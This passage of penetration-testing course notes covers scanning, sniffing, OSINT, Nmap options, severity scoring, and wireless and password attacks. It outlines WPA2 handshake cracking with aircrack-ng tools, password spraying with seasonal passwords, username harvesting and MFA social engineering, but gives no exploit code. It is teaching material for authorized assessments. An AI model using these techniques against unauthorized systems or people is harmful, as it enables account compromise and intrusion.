&nbsp;			§ Identify failures/warnings, then compare against client standards.

&nbsp;			§ Pros: Pinpoints likely high-risk misconfigurations.

&nbsp;			§ Cons: Not a direct one-to-one mapping; may flag items the client already deems unnecessary.

&nbsp;		○ Approach #2: Tailored Technical Policy + Targeted Scan

&nbsp;			§ Build a custom technical policy based on client’s hardening standards.

&nbsp;			§ Use enterprise vulnerability/configuration scanners with authenticated scans.

&nbsp;			§ Pros: More efficient, ensures alignment with client-specific standards.

&nbsp;			§ Cons: Requires access to advanced scanning tech and setup.

&nbsp;		○ Preferred Practices

&nbsp;			§ Start with general tools for broad coverage.

&nbsp;			§ Narrow down findings by validating against client hardening standards.

&nbsp;			§ Use enterprise-grade, policy-driven scans when available for maximum efficiency.



Network Sniffing

&nbsp;	• Network sniffing involves capturing and analyzing network traffic, but its effectiveness depends heavily on timing, placement, and scope. Proper planning ensures meaningful results, such as detecting insecure protocols, unencrypted data, and policy violations.

&nbsp;	• Key Concepts

&nbsp;		○ Time and Duration Matter

&nbsp;			§ The amount of data = directly tied to how long the sniffer runs.

&nbsp;			§ Sniffing at the wrong time skews results:

&nbsp;				□ Before/after office hours → little to no endpoint traffic.

&nbsp;				□ During lunch → personal browsing instead of business activity.

&nbsp;			§ Must align sniffing window with normal business operations.

&nbsp;		○ Placement in the Network

&nbsp;			§ Results depend on which network segment is monitored.

&nbsp;			§ Use client network diagrams to choose the best placement.

&nbsp;			§ Typical placements:

&nbsp;				□ Perimeter → see inbound/outbound traffic.

&nbsp;				□ Behind firewalls → validate filtering rules.

&nbsp;				□ Behind IDS/IPS → confirm alerts/rules fire correctly.

&nbsp;				□ In front of sensitive systems/apps → check principle of least privilege.

&nbsp;				□ On segments requiring encryption → verify compliance.

&nbsp;		○ Data to Look For

&nbsp;			§ Active devices and identifiers (OS, applications).

&nbsp;			§ Services and protocols in use → highlight insecure/prohibited ones (e.g., Telnet).

&nbsp;			§ Unencrypted transmissions, especially sensitive data.

&nbsp;			§ Unencrypted credentials crossing the network.

&nbsp;		○ Preparation Steps

&nbsp;			§ Review network diagrams beforehand.

&nbsp;			§ Discuss with client what “normal” traffic looks like.

&nbsp;			§ Document start/stop times for context in results.



File Integrity Checking

&nbsp;	• File integrity checking (FIC) is a simple concept—comparing a file’s current hash to a trusted hash—but it’s complex to prepare for at scale. It helps detect unauthorized modifications, whether legitimate (patches, upgrades) or malicious (malware tampering). Effective use requires identifying which critical “guarded files” to monitor and implementing appropriate tools.

&nbsp;	• Key Concepts

&nbsp;		○ Core Process

&nbsp;			§ Compare two values: trusted hash vs. current hash.

&nbsp;			§ If the values match → file unchanged.

&nbsp;			§ If they differ → investigate why.

&nbsp;		○ Hashing Functions

&nbsp;			§ Tools use cryptographic hash functions like MD5 or SHA-1 to generate unique digital fingerprints of files.

&nbsp;			§ A hash uniquely identifies a file’s content.

&nbsp;		○ Trusted Hash Baseline

&nbsp;			§ Created when a file is in a known-good state.

&nbsp;			§ Must be updated when legitimate changes (patches, upgrades) occur.

&nbsp;			§ If unexpected changes occur, it may indicate malware tampering.

&nbsp;		○ Challenges of FIC

&nbsp;			§ Easy part: Running checks and comparing values.

&nbsp;			§ Hard part:

&nbsp;				□ Deciding which files to monitor.

&nbsp;				□ Maintaining an accurate, trusted database of hash values.

&nbsp;			§ Guarded Files (examples rarely expected to change)

&nbsp;				□ Windows: explorer.exe → changes may signal compromise.

&nbsp;				□ Linux: /etc/passwd → changes could mean unauthorized account creation.

&nbsp;		○ Enterprise Scale Problem

&nbsp;			§ Thousands of files across many systems makes full coverage impractical.

&nbsp;			§ Best approach: security/system admins define a short, critical list of files.

&nbsp;		○ Tools for File Integrity Monitoring (FIM)

&nbsp;			§ Commercial: Tripwire → popular enterprise solution.

&nbsp;			§ Open-source: OSSEC → host-based intrusion detection with FIM.

&nbsp;			§ Some vulnerability management tools include basic FIM features.

&nbsp;				□ Useful for monitoring a small set of files daily.

&nbsp;				□ Not scalable, but good as a starting point.



#### Identifying Your Targets



Network Discovery

&nbsp;	• Network discovery validates network documentation and firewall rules by identifying live systems and services. It can be done through active scanning (sending probes) or passive scanning (observing traffic), with passive methods being safer for fragile environments like ICS/OT networks.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Network Discovery

&nbsp;			§ Documentation and ruleset reviews are useful, but theoretical.

&nbsp;			§ Discovery scanning provides practical, current-state information.

&nbsp;			§ Helps confirm which systems are live and what services they run.

&nbsp;		○ Preparation

&nbsp;			§ Use network diagrams and firewall configs to build a target list.

&nbsp;			§ Configure scanning tools to match the target network segments.

&nbsp;		○ Two Types of Discovery Scanning

&nbsp;			§ Active Scanning

&nbsp;				• Directly interacts with systems by sending packets.

&nbsp;				• Examples:

&nbsp;					® Ping (ICMP) → checks if host is up.

&nbsp;					® OS/service fingerprinting → identifies running systems and services.

&nbsp;				• More thorough but can disrupt fragile systems.

&nbsp;			§ Passive Scanning

&nbsp;				• Does not interact with targets.

&nbsp;				• Captures traffic (e.g., via Wireshark) and extracts source/destination IPs and services.

&nbsp;				• Safer but requires network visibility.

&nbsp;		○ Evolving Tools

&nbsp;			§ Vendors like Tenable and Qualys now offer passive network scanners.

&nbsp;			§ Devices sit on networks, monitor traffic, and identify live hosts automatically.

&nbsp;		○ Special Case: OT/ICS Environments

&nbsp;			§ Industrial Control Systems (ICS) and Operational Technology (OT) often can’t tolerate active scans.

&nbsp;			§ Risks: simple active probes may cause devices to crash or reset to factory defaults.

&nbsp;			§ Passive scanning is strongly recommended in these environments.



Open Source Intelligence

&nbsp;	• OSINT gathering is a passive technique that leverages publicly available information to identify target systems without directly interacting with them. It’s valuable for penetration testers but comes with limitations such as inaccuracy, outdated data, and limited usefulness for internal networks.

&nbsp;	• Key Concepts

&nbsp;		○ Definition of OSINT Gathering

&nbsp;			§ Uses publicly available repositories and information.

&nbsp;			§ Does not directly touch target systems.

&nbsp;			§ Helps identify systems and infrastructure for further assessment.

&nbsp;		○ Limitations

&nbsp;			§ Data may be inaccurate or outdated (false positives if systems were decommissioned).

&nbsp;			§ Generally limited to internet-facing systems, not internal networks.

&nbsp;		○ Exception – DNS Zone Transfers

&nbsp;			§ If improperly configured, a DNS zone transfer can expose internal hostnames and IP addresses.

&nbsp;			§ Best practice: restrict zone transfers to authorized internal hosts only, or disable them entirely.

&nbsp;			§ Performing zone transfers requires explicit client permission.

&nbsp;		○ OSINT Resources

&nbsp;			§ Shodan – Search engine for internet-connected devices.

&nbsp;			§ Censys – Provides internet-wide scan data.

&nbsp;			§ BGP Toolkit – Helps analyze internet routing information.

&nbsp;			§ Hacker Target Zone Transfer Test – Semi-passive tool to test DNS servers.

&nbsp;			§ ZoneTransfer.me (by Digi Ninja) – Safe environment to practice DNS zone transfers.

&nbsp;		○ Rules of Engagement

&nbsp;			§ Always get client approval before attempting semi-passive methods like DNS queries.

&nbsp;			§ In some cases, clients may provide direct DNS exports instead.

&nbsp;		○ Unexpected Discoveries

&nbsp;			§ Network discovery (via OSINT or scanning) may uncover unauthorized devices.

&nbsp;			§ Best practice: stop and notify the client immediately.

&nbsp;				□ Could be a policy violation (employee device).

&nbsp;				□ Or worse, an attacker-planted device for persistence.



Network Port and Service Identification

&nbsp;	• After discovering live hosts, the next step in network assessment is identifying open ports and running services. This provides deeper insight into potential security risks, especially insecure protocols and exposed administration services. Tools like Nmap make this process efficient but require careful configuration for thorough and accurate results.

&nbsp;	• Key Concepts

&nbsp;		○ Importance of Port \& Service Discovery

&nbsp;			§ Finding hosts is just the start; knowing which ports are open and which services are running is critical for security assessment.

&nbsp;			§ Reveals potential attack vectors for exploitation.

&nbsp;		○ Dealing with Blocked Ping

&nbsp;			§ Some hosts/networks block ICMP ping requests.

&nbsp;			§ Nmap has a flag to assume hosts are alive, improving detection accuracy at the cost of longer scans.

&nbsp;		○ Key Targets to Identify

&nbsp;			§ Unencrypted protocols → high risk:

&nbsp;				□ Telnet.

&nbsp;				□ FTP.

&nbsp;				□ HTTP (credentials often visible in captures).

&nbsp;			§ Remote administration tools → sensitive:

&nbsp;				□ SSH, RDP, VNC, HTTPS.

&nbsp;			§ Nmap Options for Service Identification

&nbsp;				□ -A (aggressive scan) → detects service/version information.

&nbsp;				□ Default scan → top 1,000 most common TCP ports.

&nbsp;				□ -p flag → specify ports/ranges:

&nbsp;					® Example: -p 80 for HTTP.

&nbsp;					® -p 1-65535 → scans all 65k+ TCP ports (and UDP, if specified).

&nbsp;				□ -p 1-65535 → scans all 65k+ TCP ports (and UDP, if specified).

&nbsp;			§ Trade-off: broader scans = more time and network traffic, but yield comprehensive results.

&nbsp;		○ Scanning Strategy for DMZs

&nbsp;			§ Perform scans from both external and internal vantage points:

&nbsp;				□ External scan → shows what outsiders can access.

&nbsp;				□ Internal scan → shows what an attacker could exploit if they gain a foothold inside.



Vulnerability Scanning

&nbsp;	• After host and service discovery, the next step is vulnerability scanning—identifying weaknesses that attackers could exploit. Vulnerability scans provide descriptions, severity scores, and remediation guidance, but they carry risks, especially with older or fragile systems. The choice between authenticated and unauthenticated scans is critical for balancing depth of results and potential impact.

&nbsp;	• Key Concepts

&nbsp;		○ Purpose of Vulnerability Scanning

&nbsp;			§ Detect weaknesses that could be:

&nbsp;				□ Exploited intentionally by attackers.

&nbsp;				□ Exploited intentionally by attackers.

&nbsp;			§ Scanners provide:

&nbsp;				□ Vulnerability description.

&nbsp;				□ Severity score.

&nbsp;				□ Remediation guidance.

&nbsp;			§ Risks of Vulnerability Scans

&nbsp;				□ Scans can disrupt fragile or outdated systems (e.g., old switch rebooting mid-scan).

&nbsp;				□ Even authorized scans can cause unintended outages.

&nbsp;				□ However, findings can justify upgrades and strengthen security.

&nbsp;			§ Authenticated vs. Unauthenticated Scans

&nbsp;				□ Authenticated scans:

&nbsp;					® Provide deeper, more complete results.

&nbsp;					® Higher risk of negative impact.

&nbsp;				□ Unauthenticated scans:

&nbsp;					® Simulate an outsider’s view.

&nbsp;					® Safer for fragile systems but less detailed.

&nbsp;				□ Recommended Best Practices

&nbsp;					® Internal hosts: Perform authenticated scans.

&nbsp;					® External hosts: Perform unauthenticated scans.

&nbsp;					® Web applications:

&nbsp;						◊ Non-production → authenticated scans.

&nbsp;						◊ Production → unauthenticated scans.

&nbsp;					® Mobile applications: Perform offline scans on production instances.



Determining Severity

&nbsp;	• Vulnerability severity is determined by evaluating both the likelihood of exploitation and the impact if exploited. Industry standards such as CVSS, CWE, and EPSS provide structured, repeatable ways to assess and prioritize vulnerabilities for remediation.

&nbsp;	• Key Concepts

&nbsp;		○ Severity Factors

&nbsp;			§ Likelihood of exploitation → how easy is it for an attacker?

&nbsp;			§ Impact of exploitation → what happens if successful (confidentiality, integrity, availability)?Examples

&nbsp;		○ Examples

&nbsp;			§ Low severity: external system leaks internal hostnames.

&nbsp;			§ High severity: internet-facing system with command injection allowing full admin control.

&nbsp;		○ Common Vulnerability Scoring System (CVSS)

&nbsp;			§ Open industry standard for scoring OS vulnerabilities.

&nbsp;			§ Uses base metrics:

&nbsp;				□ Access vector (how it’s exploited).

&nbsp;				□ Attack complexity (easy vs. difficult).

&nbsp;				□ Authentication (does attacker need credentials?).

&nbsp;			§ Uses impact metrics: CIA triad (confidentiality, integrity, availability).

&nbsp;			§ Produces a repeatable severity score.

&nbsp;		○ Common Weakness Enumeration (CWE)

&nbsp;			§ Catalog of software/hardware weaknesses that can lead to vulnerabilities.

&nbsp;			§ Includes:

&nbsp;				□ Likelihood of exploit.

&nbsp;					® Memberships/relationships (e.g., CWE-242 → dangerous functions → linked to prohibited code).

&nbsp;				□ Helps testers map and connect related vulnerabilities.

&nbsp;		○ Exploit Prediction Scoring System (EPSS)

&nbsp;			§ Predicts likelihood of exploitation in the wild.

&nbsp;			§ Uses data and statistics.

&nbsp;			§ Provides a percentage score → closer to 100% = higher urgency.

&nbsp;			§ Complements CVSS and CWE.

&nbsp;		○ Vulnerability Disclosure Lifecycle

&nbsp;			§ Ethical researchers first privately disclose findings to vendors.

&nbsp;			§ Vendors patch before public release.

&nbsp;			§ Once public, scanning vendors develop detection signatures.

&nbsp;			§ Security testers then use updated tools to detect those vulnerabilities.



Wireless Nessus

&nbsp;	• Wireless scanning is a critical step in securing enterprise environments that rely heavily on Wi-Fi. It involves understanding the scope, environment, and security settings of wireless networks, identifying weak configurations, and ensuring that organizations adopt strong, modern standards like WPA2/WPA3 Enterprise.

&nbsp;	• Key Concepts

&nbsp;		○ Evolution of Wireless in Enterprise

&nbsp;			§ Early 2000s → wireless adoption grew slowly.

&nbsp;			§ 2007 iPhone launch → accelerated the mobile enterprise experience.

&nbsp;			§ Now common to see multiple networks:

&nbsp;				□ Managed devices.

&nbsp;				□ Personal/BYOD devices.

&nbsp;				□ IoT devices.

&nbsp;		○ Pre-Assessment Questions

&nbsp;			§ Which locations should have wireless enabled?

&nbsp;			§ Any environmental interference? (e.g., window films, nearby networks).

&nbsp;			§ What security settings should apply (policy review)?

&nbsp;			§ What does a normal usage day look like (ensure endpoints are active during scans)?

&nbsp;			§ Are there security technologies that could interfere with scans?

&nbsp;		○ Wireless Scanning Setup

&nbsp;			§ Use a second wireless antenna → separates scanning traffic from normal traffic.

&nbsp;			§ Ensures cleaner, dedicated wireless data collection.

&nbsp;		○ Wireless Security Configurations (least → most secure)

&nbsp;			§ Open/unencrypted → no protection.

&nbsp;			§ WEP → insecure, easily broken.

&nbsp;			§ WPA → also broken.

&nbsp;			§ WPA2 (personal) → stronger, but only requires a password.

&nbsp;			§ WPA2 Enterprise → strong encryption + certificate-based authentication.

&nbsp;			§ WPA3 Enterprise → most secure option.

&nbsp;		○ Penetration Testing Considerations

&nbsp;			§ Any configuration weaker than WPA2 = significant risk.

&nbsp;			§ Tools to break WEP/WPA have been effective for years.

&nbsp;			§ WPA2/WPA3 Enterprise is recommended:

&nbsp;				□ Requires both password + certificate, preventing simple credential-based access.



Wireless Testing Process

&nbsp;	• The wireless testing process uses both passive and active scanning techniques to identify wireless networks, capture authentication handshakes, and potentially crack encryption keys to test the strength of wireless security.

&nbsp;	• Key Concepts

&nbsp;		○ Passive Wireless Scanning

&nbsp;			§ Tools monitor the airwaves for wireless traffic.

&nbsp;			§ Works with both access point broadcasts and connected client traffic.

&nbsp;			§ Tools:

&nbsp;				□ Wireshark → captures wireless packets similar to wired captures.

&nbsp;				□ Airmon-ng → creates a virtual wireless adapter and lists networks, encryption settings, channels, MAC addresses of APs and clients.

&nbsp;				□ Airodump-ng → collects authentication handshakes between clients and access points.

&nbsp;		○ Active Wireless Scanning

&nbsp;			§ Goes beyond monitoring; involves interacting with targets.

&nbsp;			§ Example: Aireplay-ng → forces a client to disconnect, then intercepts the handshake during reconnection.

&nbsp;			§ More intrusive but more effective for penetration testing.

&nbsp;		○ Penetration Testing on WPA2 Personal Networks

&nbsp;			§ Common workflow:

&nbsp;				□ Capture handshake with Airodump-ng + Aireplay-ng.

&nbsp;				□ Use Aircrack-ng to brute force the captured encrypted handshake offline.

&nbsp;				□ If successful → recover plaintext Wi-Fi password.

&nbsp;				□ Attacker/tester can then authenticate to the network.

&nbsp;		○ Testing Goal

&nbsp;			§ Demonstrates whether weak or guessable Wi-Fi credentials can be exploited.

&nbsp;			§ Highlights risks of relying only on WPA2 Personal passwords.



#### Vulnerability Validation



Password Cracking

&nbsp;	• Password cracking is a vital penetration testing technique for validating vulnerabilities. Since most breaches involve weak or compromised credentials, testers must understand how passwords are stored, how attackers crack them, and how to demonstrate the real risk of weak authentication.

&nbsp;	• Key Concepts

&nbsp;		○ Why Password Cracking Matters

&nbsp;			§ Vulnerability validation → proving weaknesses are real and exploitable.

&nbsp;			§ F5 breach analysis: 87% of breaches were tied to app security or identity/access management flaws.

&nbsp;			§ Verizon DBIR confirms this trend continues → attackers still focus on weak passwords and technical vulnerabilities.

&nbsp;			§ Pentesters repeatedly succeed by exploiting weak credentials to impersonate users.

&nbsp;		○ How Passwords Are Stored

&nbsp;			§ Applications often store hashed passwords, not plaintext.

&nbsp;			§ Hashing = one-way function producing a unique output.

&nbsp;			§ Login works by hashing user input and comparing it to the stored hash.

&nbsp;			§ Cracking = finding the plaintext password that matches a stored hash.

&nbsp;		○ Password Cracking Techniques

&nbsp;			§ Use wordlists to test possible passwords against hashes.

&nbsp;			§ Wordlist quality directly impacts cracking success.

&nbsp;			§ Cracking overlaps art + science: choosing likely candidates is key.

&nbsp;		○ RockYou Wordlists

&nbsp;			§ 2009 RockYou breach leaked 32M real-world passwords.

&nbsp;			§ Became a go-to wordlist for penetration testers.

&nbsp;			§ Expanded into RockYou2021 and RockYou2024, now with billions of entries.

&nbsp;			§ Included in Kali Linux by default (/usr/share/wordlists).

&nbsp;		○ Tools for Password Cracking

&nbsp;			§ Hashcat → fast, supports many hash types.

&nbsp;			§ Uses RockYou and similar wordlists effectively.

&nbsp;			§ Other resources: Hash Crack: Password Cracking Manual.



Penetration Test Planning

&nbsp;	• Effective penetration test planning requires clearly defining the scope, goals, and methodology, ensuring proper authorization, and aligning test activities with the client’s expectations. Pen tests often focus on privilege escalation and lateral movement but may target specific data or systems depending on compliance or business needs.

&nbsp;	• Key Concepts

&nbsp;		○ Core Pen Test Activities

&nbsp;			§ Privilege escalation → compromise a system and gain admin-level access.

&nbsp;			§ Lateral movement → expand from one compromised system/application to others, extracting sensitive data.

&nbsp;			§ Alternative goals (e.g., PCI DSS) may focus on compromising cardholder data without needing admin credentials.

&nbsp;		○ Importance of Client Goals

&nbsp;			§ Understanding why the client requested the test is critical.

&nbsp;			§ Goals may vary: sensitive data exposure, regulatory compliance, or resilience testing.

&nbsp;		○ Methodologies

&nbsp;			§ NIST Four-Stage Approach:

&nbsp;				□ Planning.

&nbsp;				□ Discovery.

&nbsp;				□ Attack → includes gaining access, escalating privileges, system browsing, tool installation.

&nbsp;				□ Reporting.

&nbsp;			§ Penetration Testing Execution Standard (PTES):

&nbsp;				□ Pre-engagement interactions.

&nbsp;				□ Intelligence gathering.

&nbsp;				□ Threat modeling.

&nbsp;				□ Vulnerability analysis.

&nbsp;				□ Exploitation.

&nbsp;				□ Post-exploitation.

&nbsp;				□ Reporting.

&nbsp;			§ Best practice: combine and adapt methodologies instead of strictly following one.

&nbsp;		○ Planning Essentials

&nbsp;			§ Define scope, methodology, and goals upfront.

&nbsp;			§ Obtain written authorization from the client to test in-scope systems/applications.

&nbsp;		○ Possible Areas of Focus

&nbsp;			§ Internet-facing systems and applications.

&nbsp;			§ Mobile applications.

&nbsp;			§ Internal systems and applications.

&nbsp;			§ Physical office locations.

&nbsp;			§ Company employees (social engineering).

&nbsp;			§ Third-party hosted systems and applications.



Penetration Test Tools

&nbsp;	• Penetration test tools support reconnaissance, OSINT gathering, vulnerability analysis, and credential discovery. Tools range from automated scripts like Discover to specialized OSINT, metadata, and vulnerability scanners. Testers must balance automation with stealth, since noisy tools can trigger detection systems.

&nbsp;	• Key Concepts

&nbsp;		○ Reconnaissance vs. Scope

&nbsp;			§ After scope is defined, testers should do their own reconnaissance.

&nbsp;			§ Compare findings with client’s scope → sometimes uncover overlooked systems/apps still online.

&nbsp;		○ OSINT \& Discover Tool

&nbsp;			§ Discover (by Lee Baird) automates OSINT gathering.

&nbsp;			§ Built on Recon-ng and The Harvester.

&nbsp;			§ Requires API keys for best results:

&nbsp;				□ Bing, Google, Google CSE.

&nbsp;				□ BuiltWith (tech profiling).

&nbsp;				□ FullContact (person/company data).

&nbsp;				□ GitHub (code repos).

&nbsp;				□ Hunter.io (email addresses).

&nbsp;				□ SecurityTrails (DNS, IP).

&nbsp;				□ Shodan (domains, hosts, open ports).

&nbsp;			§ Produces rich, automated OSINT quickly.

&nbsp;		○ Vulnerability Analysis Approaches

&nbsp;			§ Automated Scanners (e.g., Nessus, Qualys):

&nbsp;				□ Detailed \& accurate results.

&nbsp;				□ Risk: noisy, may trigger SIEM alerts or IPS blocks.

&nbsp;			§ OSINT + Credentials Approach:

&nbsp;				□ Stealthier → avoids tripping alarms.

&nbsp;				□ Relies on gathering emails/usernames and exploiting login weaknesses.

&nbsp;		○ Credential Discovery Techniques

&nbsp;			§ OSINT often reveals emails + usernames.

&nbsp;			§ Patterns: firstname.lastname, f.lastname, firstname\_lastname.

&nbsp;			§ Tools:

&nbsp;				□ Hunter.io → identifies email naming conventions.

&nbsp;				□ Discover (with APIs) → automates collection.

&nbsp;				□ Manual Hunter searches → same info without automation.

&nbsp;				□ FOCA and Metagoofil → extract usernames from document metadata (Word, PDF, Excel).

&nbsp;			§ Once naming convention is known, LinkedIn can be mined for employee names → generate valid usernames.



Penetration Test Techniques

&nbsp;	• One of the most effective penetration testing techniques is password spraying, which exploits common user behaviors and weak password practices. Pen testers must keep up with evolving offensive and defensive techniques, using resources like the Red Team Field Manual (RTFM) and Blue Team Field Manual (BTFM) to stay sharp.

&nbsp;	• Key Concepts

&nbsp;		○ Password Spraying Technique

&nbsp;			§ Definition: Instead of testing many passwords against one username, test one password across many usernames.

&nbsp;			§ Advantage: Avoids account lockouts (since most systems don’t lock out users after a single failed attempt).

&nbsp;			§ Attack model: Just one weak but commonly used password can compromise accounts.

&nbsp;		○ Common Password Patterns Exploited

&nbsp;			§ Example: Season + Year + Special Character (e.g., Summer2025!).

&nbsp;			§ These meet typical password complexity requirements:

&nbsp;				□ Uppercase + lowercase.

&nbsp;				□ Alphanumeric.

&nbsp;				□ Minimum length.

&nbsp;				□ Special character.

&nbsp;			§ They also align with 90-day rotation policies (seasonal changes).

&nbsp;		○ Policy Context

&nbsp;			§ Many organizations still require 90-day password changes, despite NIST guidance advising against forced periodic changes.

&nbsp;			§ This outdated practice encourages predictable password patterns.

&nbsp;		○ Evolution of Techniques

&nbsp;			§ Penetration testing methods are constantly evolving.

&nbsp;			§ Successful testers stay updated on both attacker tools and defensive strategies.

&nbsp;		○ Recommended Resources

&nbsp;			§ Red Team Field Manual (RTFM) → offensive tactics, commands, scripts.

&nbsp;			§ Blue Team Field Manual (BTFM) → defensive strategies, incident response, log analysis.

&nbsp;			§ Both provide practical, field-ready references.



Social Engineering

&nbsp;	• Social engineering exploits human behavior rather than technology, making it one of the most effective attack methods. For penetration testers, it’s essential to include social engineering in engagements to evaluate user awareness, identify weaknesses, and provide actionable improvements for organizational resilience.

&nbsp;	• Key Concepts

&nbsp;		○ Nature of Social Engineering

&nbsp;			§ Focuses on tricking people into taking harmful actions.

&nbsp;			§ Easier than hacking technical systems in many cases.

&nbsp;			§ Should always be included in penetration tests.

&nbsp;		○ Common Attack Methods

&nbsp;			§ Phishing → malicious emails with attachments or links installing malware.

&nbsp;			§ Credential harvesting →

&nbsp;				□ Impersonating trusted staff (e.g., help desk calls).

&nbsp;				□ Fake login pages mimicking legitimate sites.

&nbsp;			§ Password reset abuse → exploiting weak secret questions (OSINT-driven).

&nbsp;		○ Tools

&nbsp;			§ Social Engineer Toolkit (SET):

&nbsp;				□ Open-source Python tool by Dave Kennedy.

&nbsp;				□ Pre-installed in Kali Linux.

&nbsp;				□ Contains multiple attack vectors against websites, wireless networks, email, mobile, and hardware.

&nbsp;				□ Automates phishing, credential harvesting, and other social engineering attacks.

&nbsp;		○ Beyond Phishing

&nbsp;			§ Physical site visits → test office security by bypassing reception, planting rogue devices, or leaving malicious USB drives.

&nbsp;			§ MFA social engineering → tricking users into providing valid MFA codes under the guise of IT support.

&nbsp;			§ Password self-service portals → exploiting weak or easily guessed answers to reset credentials without direct contact.

&nbsp;		○ Ethical Purpose

&nbsp;			§ Goal isn’t to embarrass employees.

&nbsp;			§ Purpose is to evaluate awareness, identify weak spots, and provide targeted guidance to strengthen defenses.



#### Additional Considerations



Coordinating Your Assessments

&nbsp;	• Coordinating security assessments requires careful planning around stakeholders, scheduling, access, authorization, incident response, and communication. Proper coordination minimizes risks, prevents unnecessary disruptions, and ensures sensitive findings are handled securely.

&nbsp;	• Key Concepts

&nbsp;		○ Stakeholder Identification

&nbsp;			§ Goes beyond the cybersecurity team.

&nbsp;			§ Includes network, system, and application administrators, as well as help desk teams.

&nbsp;			§ Engaging managers early prevents confusion if suspicious activity is detected.

&nbsp;		○ Scheduling Considerations

&nbsp;			§ Choose times that minimize operational impact.

&nbsp;			§ Avoid blackout periods such as:

&nbsp;				□ Retail holidays.

&nbsp;				□ Large IT project cutovers.

&nbsp;			§ Running assessments during these times adds unnecessary business risk.

&nbsp;		○ Access and Authorization

&nbsp;			§ Ensure testers have required credentials for authenticated scans or insider simulations.

&nbsp;			§ For physical social engineering tests, testers must carry written authorization letters from the client.

&nbsp;			§ Real-world risk: testers could be mistaken for intruders (even arrested) without proper documentation.

&nbsp;		○ Incident Response Planning

&nbsp;			§ Document an engagement incident response plan before starting.

&nbsp;			§ Address scenarios such as:

&nbsp;				□ Discovering an active compromise during testing.

&nbsp;				□ Accidentally disrupting production services.

&nbsp;			§ Plan should define escalation paths and communication protocols.

&nbsp;		○ Communication Plan

&nbsp;			§ Define how updates will be shared with clients:

&nbsp;				□ Weekly emails.

&nbsp;				□ Daily or twice-daily updates.

&nbsp;				□ Real-time channels like Slack.

&nbsp;			§ Ensure secure communication methods (avoid unencrypted email for sensitive data).

&nbsp;			§ Align expectations with the client before the assessment begins.

&nbsp;		○ Pre-Engagement Meeting

&nbsp;			§ Best way to clarify scope, access, communication, and expectations.

&nbsp;			§ Ensures both client and testers are aligned and avoids misunderstandings.

&nbsp;			



Data Analysis

&nbsp;	• Data analysis during a security assessment should happen continuously, not just at the end. Effective analysis requires balancing curiosity and technical exploration with time management and client-focused reporting.

&nbsp;	• Key Concepts

&nbsp;		○ Ongoing Analysis

&nbsp;			§ Don’t wait until the end → analyze findings as you go.

&nbsp;			§ Helps maintain focus and ensures key findings aren’t overlooked.

&nbsp;		○ Challenge of Focus

&nbsp;			§ Pen testing is exciting (legal hacking, puzzles, exploration).

&nbsp;			§ Curiosity can cause testers to lose track of time and drift from engagement goals.

&nbsp;			§ Tight timeframes make time management essential.

&nbsp;		○ Discipline Through Practice

&nbsp;			§ Build analysis and reporting discipline with structured exercises:

&nbsp;				□ Run a Nessus vulnerability scan on a lab VM.

&nbsp;				□ Set a 60-minute timer to analyze results and draft a summary report.

&nbsp;				□ Hard stop after 60 minutes → focus on identifying critical findings and articulating why they matter.

&nbsp;			§ Repeating the exercise improves both analysis skills and time management.

&nbsp;		○ From Findings to Storytelling

&nbsp;			§ Clients don’t just want to know there are vulnerabilities.

&nbsp;			§ They want context:

&nbsp;				□ Why the issue matters.

&nbsp;				□ How it could impact business operations, security, or reputation.

&nbsp;			§ Reporting should translate technical results into business risk.



Providing Context

&nbsp;	• Even lower-severity vulnerabilities can be dangerous when chained together. Security testers must provide context in their analysis, connecting related findings into realistic attack paths that automated scans alone won’t reveal.

&nbsp;	• Key Concepts

&nbsp;		○ Don’t Ignore Low-Severity Issues

&nbsp;			§ Lower-severity vulnerabilities may seem minor in isolation.

&nbsp;			§ Attackers (and skilled pen testers) can chain them together to achieve serious compromise.

&nbsp;		○ Real-World Example (D-Link Routers, 2018)

&nbsp;			§ Vulnerabilities chained:

&nbsp;				□ Directory traversal (CVE-2018-10822).

&nbsp;				□ Admin password stored in plaintext (CVE-2018-10824).

&nbsp;				□ Arbitrary code execution (CVE-2018-10823).

&nbsp;			§ Attack sequence:

&nbsp;				□ Use directory traversal to browse sensitive files.

&nbsp;				□ Extract plaintext admin password.

&nbsp;				□ Log in and exploit remote code execution as an authenticated user.

&nbsp;			§ Result → full compromise of affected devices.

&nbsp;		○ Scanner vs. Pen Tester

&nbsp;			§ Vulnerability scans flag issues individually, without linking them.

&nbsp;			§ Penetration tests add value by analyzing and demonstrating how issues can be combined into a real-world exploit chain.

&nbsp;		○ Contextual Analysis Is Critical

&nbsp;			§ Testers must go beyond surface-level reporting.

&nbsp;			§ Providing context helps organizations see the true business risk of vulnerabilities.



Data Handling

&nbsp;	• Security assessments generate highly sensitive data that, if mishandled, could aid attackers. Therefore, data handling must be as carefully planned as the testing itself, covering collection, storage, transmission, and destruction.

&nbsp;	• Key Concepts

&nbsp;		○ Sensitivity of Assessment Data

&nbsp;			§ Data collected includes:

&nbsp;				□ Vulnerability scan artifacts.

&nbsp;				□ Notes, spreadsheets, mind maps.

&nbsp;				□ Communications (emails, Slack, voicemails).

&nbsp;				□ The final report (a step-by-step attack guide if leaked).

&nbsp;			§ Mishandling this data could cause severe damage to the client.

&nbsp;		○ Four Key Areas of Data Handling

&nbsp;			§ Collection

&nbsp;				□ Only collect what’s needed → avoid unnecessary liability.

&nbsp;			§ Storage

&nbsp;				□ Enforce strong encryption for data at rest.

&nbsp;				□ Use tools like BitLocker (Windows), FileVault (Mac), or VeraCrypt for encrypted volumes.

&nbsp;			§ Transmission

&nbsp;				□ Never send data over unencrypted channels.

&nbsp;				□ Use encrypted email or secure file-sharing services (Box, SharePoint, Google Drive).

&nbsp;				□ Apply principle of least privilege for access.

&nbsp;			§ Low-Tech Safeguards

&nbsp;				□ Add cover pages and confidential markings on reports.

&nbsp;				□ Helps prevent accidental mishandling.



Drafting Your Report

&nbsp;	• A security assessment report must be carefully drafted, QA’d, and tailored to different audiences (executives, management, and staff). Each audience has unique needs, and addressing them ensures the report is actionable and well-received.

&nbsp;	• Key Concepts

&nbsp;		○ Don’t Deliver the First Draft

&nbsp;			§ Avoid sending a single unreviewed draft.

&nbsp;			§ Seek client feedback during the process.

&nbsp;			§ Have a QA reviewer (someone other than yourself) check the report.

&nbsp;		○ Three Key Audiences \& Their Needs

&nbsp;			§ Executives (high-level view):

&nbsp;				□ Want the big picture, not technical details.

&nbsp;				□ Use the executive summary (short, business-centric language).

&nbsp;				□ Their focus: budget, staffing, and strategic decisions.

&nbsp;			§ Management (resource allocation):

&nbsp;				□ Need a punch-down list of priorities.

